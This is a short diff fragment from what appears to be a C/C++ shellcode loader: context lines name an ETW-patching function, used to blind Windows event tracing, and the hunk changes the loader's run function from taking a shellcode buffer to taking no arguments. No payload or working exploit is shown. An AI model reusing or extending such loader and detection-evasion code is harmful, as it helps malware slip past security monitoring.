@@ -307,7 +307,7 @@ int patchETW(void) {
 PATCHETWLOCAL*/
 
 // --- Function for loader ---
-void run(unsigned char* shellcode, size_t shellcode_len) {
+void run() {
 
         PVOID lbuffer = nullptr;
         HANDLE curproc = GetCurrentProcess();
